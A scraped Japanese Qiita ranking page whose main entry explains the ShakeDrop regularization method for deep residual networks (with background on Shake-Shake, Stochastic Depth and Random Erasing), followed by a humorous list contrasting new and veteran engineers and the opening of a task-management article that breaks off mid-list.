<p>【サマリ】本稿で解説するShakeDropは、強力な特徴レベルのdata augmentationを行うモデルであるShake-Shakeを改良することで非常に深いモデルであるPyramidNetをベースネットワークとして利用することを可能とし、更に強力な画像レベルのdata augmentationを行う<del>Cutout</del>Random Erasingを利用しつつ、1800エポックという長時間学習させることで、既存手法に対しかなりの精度向上を実現しています。</p>

<h1>
<span id="residual-networks" class="fragment"></span><a href="#residual-networks"><i class="fa fa-link"></i></a>Residual Networks</h1>

<p>Residual Networks (ResNet) <sup id="fnref2"><a href="#fn2" rel="footnote" title='K. He, X. Zhang, S. Ren, and J. Sun, "Deep Residual Learning for Image Recognition," in Proc. of CVPR, 2016.'>2</a></sup>は、大規模画像認識のコンペティションであるILSVRC'15で優勝した、現状のデファクトスタンダードといえる畳み込みニューラルネットワークのアーキテクチャです。<br>
ResNet以前まではネットワークを深くすることで表現能力を向上させ、認識精度を改善することが行われてきましたが、あまりにも深いネットワークは、batch normalization等を利用しても最適化が困難でした。<br>
ResNetでは、通常のネットワークのように、何かしらの処理ブロックによる変換$F(x)$を単純に次の層に渡していくのではなく、その処理ブロックへの入力$x$をショートカットし、$F(x)+x$を次の処理ブロックに渡すことが行われます。この処理単位はresidual unit (or building block) と呼ばれます。<br>
<a href="https://camo.qiitausercontent.com/2b20db35623485e9c348dafff47edb799a7dd66c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f33393864386662362d303261302d346561392d383738352d6139633735623935323965662e706e67" target="_blank" rel="nofollow noopener"><img width="500" alt="Residual Unit" src="https://camo.qiitausercontent.com/2b20db35623485e9c348dafff47edb799a7dd66c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f33393864386662362d303261302d346561392d383738352d6139633735623935323965662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/398d8fb6-02a0-4ea9-8785-a9c75b9529ef.png"></a><br>
左は抽象的なresidual unitの構成です。右は具体的によく使われるresidual unitの例で、カーネルサイズ3x3、チャネル数64の畳み込み層が2つ配置されています。本来はこの中にbatch normalizationとReLUが配置されますが、その並べ方は様々なため省略しています。<br>
このショートカットを通して、backpropagation時に勾配が直接下層に伝わっていくことになり、非常に深いネットワークでも学習を行うことができるようになりました。<br>
ResNetは、このresidual unitを大量に重ねることにより構成されます。</p>

<h1>
<span id="stochastic-depth" class="fragment"></span><a href="#stochastic-depth"><i class="fa fa-link"></i></a>Stochastic Depth</h1>

<p>Stochastic Depth<sup id="fnref3"><a href="#fn3" rel="footnote" title='G. Huang, Y. Sun, Z. Liu, D. Sedra, and K. Weinberger, "Deep Networks with Stochastic Depth," in Proc. of ECCV, 2016.'>3</a></sup>は、ResNetにおいて、訓練時にresidual unitをランダムにdropするという手法です（ショートカットは残します）。$l$番目のresidual unitがdropされずに生き残る確率（生存確率）$p_l$はネットワークの出力に近いほど低くなる（dropされやすくなる）ように線形に減少させます。<br>
これにより、訓練時の「期待値で見たときの深さ」が浅くなり、ResNetは非常にdeepであるゆえに学習に時間がかかるという問題を改善し、また、residual unitが確率的にdropされることにより正則化の効果が期待できます。<br>
具体的には、$l$番目のresidual unitを下記のような構成にします。ここで$b_l$はベルヌーイ変数で、確率$p_l$で1を、確率$1 - p_l$で0を取ります。<br>
<a href="https://camo.qiitausercontent.com/68011afd94ac6475076f4418c465f01d706a46b8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f31393036353862362d383765312d396539362d653465642d6639336462326133346261302e706e67" target="_blank" rel="nofollow noopener"><img width="200" alt="Stochastic" src="https://camo.qiitausercontent.com/68011afd94ac6475076f4418c465f01d706a46b8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f31393036353862362d383765312d396539362d653465642d6639336462326133346261302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/190658b6-87e1-9e96-e4ed-f93db2a34ba0.png"></a><br>
テスト時には、それぞれのresidual unitについて生存確率の期待値$p_l$を出力にかけることでキャリブレーションを行います。</p>

<h1>
<span id="shake-shake" class="fragment"></span><a href="#shake-shake"><i class="fa fa-link"></i></a>Shake-Shake</h1>

<p>Shake-Shake<sup id="fnref4"><a href="#fn4" rel="footnote" title='X. Gastaldi, "Shake-shake Regularization," in arXiv:1705.07485v2, 2017.'>4</a></sup> <sup id="fnref5"><a href="#fn5" rel="footnote" title='X. Gastaldi, "Shake-Shake Regularization of 3-branch Residual Networks, in Proc. of ICLR 2017 Workshop, 2017.'>5</a></sup>はResNetをベースとし、テンソルに対するdata augmentationを行うことで、正則化を実現する手法です。通常data augmentationは画像に対して行われますが、中間層の出力テンソル（特徴ベクトル）に対してもdata augmentationを行うことが有効であろうというのが基本的なアイディアになります。</p>

<p>下記にShake-Shakeで利用される$l$番目のresidual unitの構成を示します。<br>
<a href="https://camo.qiitausercontent.com/c9810622bce34e9ccadbaf38d5d7870c53fc1a82/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f62383866653431652d653263612d386164362d646236652d6564393636373537366163622e706e67" target="_blank" rel="nofollow noopener"><img width="640" src="https://camo.qiitausercontent.com/c9810622bce34e9ccadbaf38d5d7870c53fc1a82/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f62383866653431652d653263612d386164362d646236652d6564393636373537366163622e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/b88fe41e-e2ca-8ad6-db6e-ed9667576acb.png"></a><br>
上記のようにShake-Shakeでは、residual unit内の畳み込みを2つに分岐させ、それらを一様乱数$\alpha_l \in [0, 1]$によって混ぜ合わせるということを行います。直感的には、画像ドメインに対するdata augmentationにおいてランダムクロッピングを行うことで、その画像内に含まれている物体の割合が変動してもロバストな認識ができるように学習ができるように、特徴レベルにおいても各特徴の割合が変動してもロバストな認識ができるようにしていると解釈することができます。<br>
興味深いのは、backward時には、forward時の乱数$\alpha$とは異なる一様乱数$\beta_l \in [0, 1]$を利用するということです。テスト時には、乱数の期待値である0.5を固定で利用してforwardを行います。<br>
論文中では、上記の$\alpha_l$と$\beta_l$を、0.5固定にしたり、それぞれ同じ値を利用したりする組み合わせを網羅的に検証しており、どちらも独立してランダムに （shake） する形が良いと結論付けています。<br>
BackwardでのShakeは、residual unit毎に、learning rateをランダムにスケーリングしているような効果があり、SGDにおいて最適解に辿り着く確率を上げているのではないでしょうか（※個人の感想です）。</p>

<p>$\alpha_l$と$\beta_l$は、バッチ単位で同一にするか、画像単位で独立に決定するかの2通りが考えられますが、こちらは画像単位で独立に決定するほうが良いと実験的に示されています。<br>
これらの外乱効果は、ニューラルネットからすると迷惑限りないことですが、結果として強い正則化の効果をもたらし、既存手法に対しかなりの高精度化を実現できています。</p>

<p>なお、Shake-Shakeの学習で特徴的な点として、学習率の減衰をcosine関数で制御<sup id="fnref6"><a href="#fn6" rel="footnote" title='I. Loshchilov and Frank Hutter, "SGDR: Stochastic Gradient Descent with Warm Restarts," in Proc. of ICLR, 2017.'>6</a></sup>し、通常300エポックかけて学習を行うところを、1800エポックかけてじっくりと学習することが挙げられます。これはShake-Shakeの効果により、擬似的に学習データが非常に大量にあるような状態となっているため、長時間の学習が有効であるためと考えられます。</p>

<h1>
<span id="cutout--random-erasing" class="fragment"></span><a href="#cutout--random-erasing"><i class="fa fa-link"></i></a>Cutout / Random Erasing</h1>

<p>Cutout<sup id="fnref7"><a href="#fn7" rel="footnote" title='T. DeVries and G. W. Taylor, "Improved Regularization of Convolutional Neural Networks with Cutout," in arXiv:1708.04552, 2017.'>7</a></sup>は2017年8月15日に、Random Erasing<sup id="fnref8"><a href="#fn8" rel="footnote" title='Z. Zhong, L. Zheng, G. Kang, S. Li, and Y. Yang, "Random Erasing Data Augmentation," arXiv:1708.04896, 2017.'>8</a></sup>は2017年8月16日と、ほぼ同時期にarXivに論文が公開されたほぼ同一の手法（！）で、モデルの正則化を目的とした新しいdata augmentationを提案しています。</p>

<p>同じく正則化を目的としたDropoutは全結合層には効果がありますが、CNNに対しては元々パラメータが少ないため効果が限定的でした。より重要な観点として、CNNの入力である画像は隣接画素に相関があるので、ランダムにdropしたとしてもその周りのピクセルで補間できてしまうため、正則化の効果が限定的でした。<br>
これに対し、Cutout/Random Erasingでは入力画像をランダムなマスクで欠落させることで、より強い正則化の効果を作り出すことを狙いとしています。<br>
<a href="https://camo.qiitausercontent.com/08290f49c4157099dd5e13d33a99869cb8ad8236/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f38623063663732662d303639382d666638392d656631312d6538396331363931376431342e706e67" target="_blank" rel="nofollow noopener"><img width="640" src="https://camo.qiitausercontent.com/08290f49c4157099dd5e13d33a99869cb8ad8236/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f38623063663732662d303639382d666638392d656631312d6538396331363931376431342e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/8b0cf72f-0698-ff89-ef11-e89c16917d14.png"></a><br>
上図の左がCutout、右がRandom Erasingにおけるdata augmentation結果例です（画像はそれぞれの論文から引用）。</p>

<h2>
<span id="cutout" class="fragment"></span><a href="#cutout"><i class="fa fa-link"></i></a>Cutout</h2>

<p>Cutoutでは、マスクの形よりもサイズが重要であるとの主張から、マスクの形状は単純なサイズ固定の正方形を利用し、そのマスクを画像のランダムな位置にかけて、その値を（データセットの？）平均値にしてしまいます。<br>
より詳細には、マスクの中心位置を画像中のランダムな位置に設定し、その周りをマスクします。これにより、マスクの一部が画像からはみ出すケースが発生し、このようなあまりマスクをしすぎないケースが存在することも重要だと主張しています。<br>
より明示的には、一定の確率でマスクを掛けないケースを許容することも考えられると記載されています（後述のRandom Erasingではそうなっています）。<br>
<a href="https://camo.qiitausercontent.com/da96e88317625de44e29afa9ff37f0ee3917443a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f37653166393838622d643864612d623438392d386464392d6533363864386636393765302e706e67" target="_blank" rel="nofollow noopener"><img width="640" src="https://camo.qiitausercontent.com/da96e88317625de44e29afa9ff37f0ee3917443a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f37653166393838622d643864612d623438392d386464392d6533363864386636393765302e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/7e1f988b-d8da-b489-8dd9-e368d8f697e0.png"></a><br>
Cutoutの効果は上図（縦軸精度、横軸マスクのサイズ）のようにマスクのサイズに依存し、データセットとタスクによって最適なサイズが違うことが予想されます。</p>

<h2>
<span id="random-erasing" class="fragment"></span><a href="#random-erasing"><i class="fa fa-link"></i></a>Random Erasing</h2>

<p>Random Erasingでは、まず各画像に対しマスクを行うか行わないかをランダムに決定します。<br>
マスクを行う場合には、まず画像中の何%をマスクするかを予め決められた範囲内からランダムに決定します。次に、同じく予め決められた範囲内でマスクのアスペクト比を決定します。最後にマスクの場所をランダムに決定し、マスク内の画素を0から255のランダムな値に変更します。<br>
上記をベースとし、物体検出のように認識対象のBounding Boxが与えられるケースでは、それぞれの物体に対し、個別にRandom Erasingを行うことも提案しています。</p>

<p>具体的なパラメータとしては、実験的に、マスクをする確率を0.5、マスクの割合を2%〜40%、アスペクト比を0.3〜1/0.3とすることが推奨されています。<br>
また、マスクでどのように画素を変更するかについて、ランダム、平均（Cutoutと同じ）、0、255の4種類のアプローチを比較しており、ランダムが一番良かったと報告されています（平均もほぼ同じ）。<br>
Cutoutでは画像分類タスクのみでしか評価されていませんでしたが、Random Erasingの論文では、画像分類に加えて物体検出と人物照合タスクについても有効性が確認されています。</p>

<h1>
<span id="shakedrop" class="fragment"></span><a href="#shakedrop"><i class="fa fa-link"></i></a>ShakeDrop</h1>

<p>やっと本題の手法です。他の論文との整合性のため、notationを変えてあります。</p>

<p>ShakeDrop<sup id="fnref1"><a href="#fn1" rel="footnote" title='山田良博, 岩村雅一, 黄瀬浩一, "PyramidNetに対する新たな確率的正則化手法ShakeDropの提案," 信学技報, 2017.'>1</a></sup>は、一言で言えば、Stochastic Depthにおいて、層をdropさせる代わりに、forward/backward時にShake-Shakeのような外乱を加える（shakeすると表現します）手法です。<br>
ベースネットワークとして、ResNetではなく、より精度が高いPyramidNet<sup id="fnref9"><a href="#fn9" rel="footnote" title='D. Han, J. Kim, and J. Kim, "Deep Pyramidal Residual Networks," arXiv:1610.02915, 2016.'>9</a></sup>を利用しています（が、本手法の本質ではないはずです）。</p>

<p>下記にShakeDropで利用される$l$番目のresidual unitの構成を示します。<br>
<a href="https://camo.qiitausercontent.com/30fb0da7b94f7df6a1d8b720fca5f86151e45c10/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f35323062323631632d393465342d333163622d356138322d3332383361313233333134312e706e67" target="_blank" rel="nofollow noopener"><img width="640" src="https://camo.qiitausercontent.com/30fb0da7b94f7df6a1d8b720fca5f86151e45c10/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f35323062323631632d393465342d333163622d356138322d3332383361313233333134312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/520b261c-94e4-31cb-5a82-3283a1233141.png"></a><br>
上図において、$b_l$は、確率$p_l$で1を、$1 - p_l$で0を取るベルヌーイ変数です。Stochastic Depthと同様に$p_l$はネットワークの出力層に近いほど小さな値を取るように設計され、$p_l = 1 - \frac{l}{2L}$と定義されます（$L$はresidual unit数）。</p>

<p>$\alpha_l$と$\beta_l$はShake-Shakeと同様に、forward/backward時に出力をスケーリングする乱数です。テスト時には、forward時のスケーリング$b_l + (1 - b_l)\alpha_l$の期待値をかけてあげます。<br>
上図において、$p_l = 1$（全くdropされない）とすれば通常のresidual unitと同様になり、$p_l = 0$（常にdropする）とすれば、Shake-Shakeと同様に全ての入力に対しshakeするようなreisual unitになります。<br>
逆に、$\alpha_l = 0$と$\beta_l = 0$とすれば、Stochastic Depthと同一になります。</p>

<p><a href="https://camo.qiitausercontent.com/1a7eca9703c3f526cfd1f199aba364a4bf147764/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f37316631346161322d306239352d656262372d383763662d6161346665323265393135312e706e67" target="_blank" rel="nofollow noopener"><img width="400" src="https://camo.qiitausercontent.com/1a7eca9703c3f526cfd1f199aba364a4bf147764/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f37316631346161322d306239352d656262372d383763662d6161346665323265393135312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/71f14aa2-0b95-ebb7-87cf-aa4fe22e9151.png"></a><br>
$\alpha_l$と$\beta_l$が取りうる範囲は、幾つかの候補から最も精度が良くなった$\alpha_l \in [-1, 1]$と$\beta_l \in [0, 1]$が採用されています。<br>
解釈が難しいのが、$\alpha_l$と$\beta_l$の正負が異なるケースが存在することです。そのようなケースでは、実際にupdateすべき勾配と逆の方向にパラメータがアップデートされることになります（正負が同じであれば、スケールが違うだけで方向は同じなのでそこまで変ではない）。<br>
1つの解釈としては、逆の勾配でアップデートされるということは、前のステップのパラメータに戻るような効果があり、パラメータをannelingするような影響があるのかもしれません。<br>
なお、$p_l &gt; 0.5$であれば（本論文の設定では満たされる）、期待値上は正しい方向にパラメータは進んでいくはずです（そもそもSGDでmomentumを利用する場合には、実際には正しい方向にアップデートされそうですが）。</p>

<p>なお、予備実験において、$p_l = 0$とする（常にshakeする）場合では、全く学習できなかったことが報告されており、全てshakeすることは外乱としては強すぎることが伺えます。Shake-Shakeのケースでは、2つに分岐した畳み込みが似たような特徴を学習することで、この影響を軽減しているのではないかと思います。</p>

<p>$\alpha_l$と$\beta_l$をどの単位で変化させるかですが、Shake-Shakeの論文ではバッチ単位と画像単位のみしか検証されていませんでしたが、本論文ではチャネル単位と画素単位でも検証が行われています。<br>
<a href="https://camo.qiitausercontent.com/ac476bb61707522044c2af1137688b16ecad9979/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f65383561356165322d346363302d343730342d326161622d6564306638643562336161622e706e67" target="_blank" rel="nofollow noopener"><img width="480" src="https://camo.qiitausercontent.com/ac476bb61707522044c2af1137688b16ecad9979/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f65383561356165322d346363302d343730342d326161622d6564306638643562336161622e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/e85a5ae2-4cc0-4704-2aab-ed0f8d5b3aab.png"></a><br>
上記のように、チャネル単位での精度が良いことが示されています。</p>

<p>ShakeDropは、Shake-Shakeと比較すると、2つに分岐させていた畳み込みが1つになっており、パラメータを半分にできている一方、ベースネットワークとしてPyramidNetを利用することで、同等のパラメータで総数を大幅に増加させており、その辺りが高精度化に効いていると思われます。<br>
また、ShakeDropでは、Shake-Shakeと同様に1800エポックの学習を行っていますが、cosine関数で学習率で制御するのではなく、エポックが全体の1/2および3/4となるタイミングで学習率を1/10とするスケジューリングを行っています。</p>

<p>下記が、既存のstate-of-the-artの手法との比較結果です。<br>
<a href="https://camo.qiitausercontent.com/af51ff51ad761c5e4215399450dae496a2883620/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f37663438663639642d666235362d636264312d666461322d6230373538313838336539622e706e67" target="_blank" rel="nofollow noopener"><img width="640" src="https://camo.qiitausercontent.com/af51ff51ad761c5e4215399450dae496a2883620/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133393830392f37663438663639642d666235362d636264312d666461322d6230373538313838336539622e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/139809/7f48f69d-fb56-cbd1-fda2-b07581883e9b.png"></a><br>
6倍学習と書かれている箇所は、1800エポックで学習したか、矩形前処理はCutoutを行っているかです。<br>
ShakeDropは、PyramidNetをベースネットワークすることで、非常に深いネットワークを利用しつつ、その総数でも利用できるようなShake-Shakeの代替アーキテクチャを利用し、更に<del>Cutout</del>Random Erasingを組み合わせて長時間学習させることで、既存手法に対しかなりの精度向上を実現できていることがわかります。</p>

<p>以上が、ShakeDropの全体像になります。<br>
結果としてのモデルアーキテクチャとしては比較的シンプルであるにも関わらず、非常に高精度な認識を実現しているということで、一度試してみてはいかがでしょうか。</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>山田良博, 岩村雅一, 黄瀬浩一, "PyramidNetに対する新たな確率的正則化手法ShakeDropの提案," 信学技報, 2017. <a href="#fnref1">↩</a></p>
</li>

<li id="fn2">
<p>K. He, X. Zhang, S. Ren, and J. Sun, "Deep Residual Learning for Image Recognition," in Proc. of CVPR, 2016. <a href="#fnref2">↩</a></p>
</li>

<li id="fn3">
<p>G. Huang, Y. Sun, Z. Liu, D. Sedra, and K. Weinberger, "Deep Networks with Stochastic Depth," in Proc. of ECCV, 2016. <a href="#fnref3">↩</a></p>
</li>

<li id="fn4">
<p>X. Gastaldi, "Shake-shake Regularization," in arXiv:1705.07485v2, 2017. <a href="#fnref4">↩</a></p>
</li>

<li id="fn5">
<p>X. Gastaldi, "Shake-Shake Regularization of 3-branch Residual Networks, in Proc. of ICLR 2017 Workshop, 2017. <a href="#fnref5">↩</a></p>
</li>

<li id="fn6">
<p>I. Loshchilov and Frank Hutter, "SGDR: Stochastic Gradient Descent with Warm Restarts," in Proc. of ICLR, 2017. <a href="#fnref6">↩</a></p>
</li>

<li id="fn7">
<p>T. DeVries and G. W. Taylor, "Improved Regularization of Convolutional Neural Networks with Cutout," in arXiv:1708.04552, 2017. <a href="#fnref7">↩</a></p>
</li>

<li id="fn8">
<p>Z. Zhong, L. Zheng, G. Kang, S. Li, and Y. Yang, "Random Erasing Data Augmentation," arXiv:1708.04896, 2017. <a href="#fnref8">↩</a></p>
</li>

<li id="fn9">
<p>D. Han, J. Kim, and J. Kim, "Deep Pyramidal Residual Networks," arXiv:1610.02915, 2016. <a href="#fnref9">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">60位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>168</kbd>
		<a target="_blank" href="https://qiita.com/newta/items/818e4a0e972c504f40bd">新人エンジニアとのジェネレーションギャップ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-13<br />09:10:24</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/17213.html">newta</a>(48件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/17213/profile-images/1473682092">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Java]</b> <b>[Git]</b> <b>[プログラミング]</b> <b>[マネジメント]</b> <b>[新人プログラマ応援]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>ふと自分がベテランエンジニア(おっさん)になってしまった、、、と感じたので書いてみる。</p>

<p>Javaとか普通に使われてると思うし、makeもC系だと普通だとおもうし、メッチャ偏見を入れて書いていることをご了承ください (笑)</p>

<h2>
<span id="バージョン管理ツール" class="fragment"></span><a href="#%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86%E3%83%84%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>バージョン管理ツール</h2>

<p>新人</p>

<ul>
<li>Gitしかやったこと無い</li>
<li>SVN聞いたことあります</li>
<li>CVS？CSVじゃなくて？</li>
</ul>

<p>おっさん</p>

<ul>
<li>SVNやCVSって言うのがあってだな</li>
<li>VSSって知ってるか？</li>
<li>ファイルサーバで上書きされることとかあったよー</li>
</ul>

<h2>
<span id="サーバインスタンス" class="fragment"></span><a href="#%E3%82%B5%E3%83%BC%E3%83%90%E3%82%A4%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>サーバインスタンス</h2>

<p>新人</p>

<ul>
<li>ポチポチ (AWS、GCP、さくらVPS)</li>
<li>Herokuでいいっすか？ GAEでいいっすか？</li>
</ul>

<p>おっさん</p>

<ul>
<li>納品まで時間が掛かるから、早めにスペック確定して発注しないと</li>
<li>サーバルーム行ってくる</li>
<li>ソコのおいてあるのが開発用サーバだから電源消しちゃダメだよ</li>
</ul>

<h2>
<span id="プログラミング言語" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E8%A8%80%E8%AA%9E"><i class="fa fa-link"></i></a>プログラミング言語</h2>

<p>新人</p>

<ul>
<li>PythonとScalaなら触ってました</li>
<li>Swift書いたことあるけどObjectiveCは触ったことないです</li>
<li>C++なら授業で少しだけ。Cは触ったことないです</li>
<li>Java書いたことない</li>
</ul>

<p>おっさん</p>

<ul>
<li>CとC++のポインタがつまづくとこだよね！</li>
<li>Javaはなかなか良いんだよ！ 型がいい！ チェック例外とstream処理の相性最悪だけど</li>
<li>ObjectiveCで書いてるときはちゃんと自分でメモリ管理していたんだよ</li>
</ul>

<h2>
<span id="ビルドリリース" class="fragment"></span><a href="#%E3%83%93%E3%83%AB%E3%83%89%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>ビルド&amp;リリース</h2>

<p>新人</p>

<ul>
<li>CodeDeploy、Cloud Formation、Kubernetes</li>
<li>CircleCI、TravisCI</li>
<li>Ansible、Fabric</li>
<li>jenkins聞いたことある。おっさんのやつでしょ？</li>
</ul>

<p>おっさん</p>

<ul>
<li>make最強</li>
<li>おれのshell力をみせてやる</li>
<li>ローカルでコンパイル、ビルドしてFTP転送</li>
<li>ハドソンってしってるか？ ゲーム会社とは別なんだよー</li>
</ul>

<h2>
<span id="データのやり取り" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E3%82%84%E3%82%8A%E5%8F%96%E3%82%8A"><i class="fa fa-link"></i></a>データのやり取り</h2>

<p>新人</p>

<ul>
<li>スプレッドシートに一覧にします</li>
<li>wikiにまとめておきますね</li>
<li>議事録 スマホのカメラでパシャっとしてアップロード</li>
<li>ファイルをbox、google driveに上げときますね</li>
</ul>

<p>おっさん</p>

<ul>
<li>開発項目_最新(3)_fix版_修正.xls</li>
<li>今、図を書いているので待って下さい！</li>
<li>MOは容量が大きくていいな〜 CD-Rは書き換えれないからな</li>
</ul>

<h2>
<span id="チャットツール" class="fragment"></span><a href="#%E3%83%81%E3%83%A3%E3%83%83%E3%83%88%E3%83%84%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>チャットツール</h2>

<p>新人</p>

<ul>
<li>Slack、ChatWork、Hangout</li>
<li>LINE</li>
<li>Facebook Messenger</li>
</ul>

<p>おっさん</p>

<ul>
<li>仕事中はチャットツール禁止</li>
<li>IP Messenger</li>
<li>MSN Messenger, Yahoo Messenger</li>
<li>ICQ (カッコー)</li>
</ul>

<h1>
<span id="コメント下さい" class="fragment"></span><a href="#%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E4%B8%8B%E3%81%95%E3%81%84"><i class="fa fa-link"></i></a>コメント下さい</h1>

<p>こんなあるある思いついたらコメントにメッセージ下さい (笑)</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">61位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>168</kbd>
		<a target="_blank" href="https://qiita.com/0w0/items/f2aafd0d9a5fa95f7c24">【よいこのオマケ記事】超短期型タスク管理をカバーする！すてきな中長期計画法</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-18<br />20:16:40</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/154302.html">0w0</a>(7件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/154302/profile-images/1505133762">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[todo]</b> <b>[プロジェクト管理]</b> <b>[Management]</b> <b>[タスク管理]</b> <b>[プロジェクトマネジメント]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="前回までのあらすじ" class="fragment"></span><a href="#%E5%89%8D%E5%9B%9E%E3%81%BE%E3%81%A7%E3%81%AE%E3%81%82%E3%82%89%E3%81%99%E3%81%98"><i class="fa fa-link"></i></a>前回までのあらすじ</h2>

<p>先日、<a href="http://qiita.com/0w0/items/0b287be30af6539ac5e9" id="reference-3fe5e31f2a355f84d871">プロジェクトの残業を50%削減したタスク管理手法を惜しみなく公開する</a>という記事で、私的に上手く行ったタスク管理手法を紹介した。幸いな事に概ね好評だったようだが、「中長期管理はどうしてるの？」という意見を多数見かけたので、オマケとしてちょこっと書いてみる次第。<br>
※前記事の流れを踏まえるので、予め読んで頂いた方が理解がスムーズかも？</p>

<p>ちなみに、中長期計画は案件状況によって管理手法を大きく変えた方が良いと思っているので、あくまで「手法の一つ」と捉えて貰えると嬉しい。なお、期間の単位は2〜3ヶ月程度を想定する。（なので、どちらかといえば「中期」に該当する考え方がメインとなる）</p>

<h2>
<span id="タスク管理と中長期管理の守備範囲について" class="fragment"></span><a href="#%E3%82%BF%E3%82%B9%E3%82%AF%E7%AE%A1%E7%90%86%E3%81%A8%E4%B8%AD%E9%95%B7%E6%9C%9F%E7%AE%A1%E7%90%86%E3%81%AE%E5%AE%88%E5%82%99%E7%AF%84%E5%9B%B2%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>タスク管理と中長期管理の守備範囲について</h2>

<p>RPG的っぽい雑な例えを持ち出すと、「突発的にエンカウントするモンスターの対処」が<a href="http://qiita.com/0w0/items/0b287be30af6539ac5e9">前記事</a>の領域で、「ストーリー、イベント進行の段取り」が当記事の領域と区別している。それぞれの特徴を挙げると次の通り。</p>

<h3>
<span id="前記事のタスク管理" class="fragment"></span><a href="#%E5%89%8D%E8%A8%98%E4%BA%8B%E3%81%AE%E3%82%BF%E3%82%B9%E3%82%AF%E7%AE%A1%E7%90%86"><i class="fa fa-link"></i></a>前記事のタスク管理</h3>

<ul>
<li>目先のタスク対応が関心事</li>
<li>一番細かい粒度で運用</li>
<li>変更量が多い</li>
<li>内部メンバー向け</li>
<li>カジュアルに回せる</li>
<li>チーム全体がオーナー(とはいえ、管理側でガイドは実施する) </li>
<li>棚卸はデイリーミーティングベース</li>
</ul>

<h3>
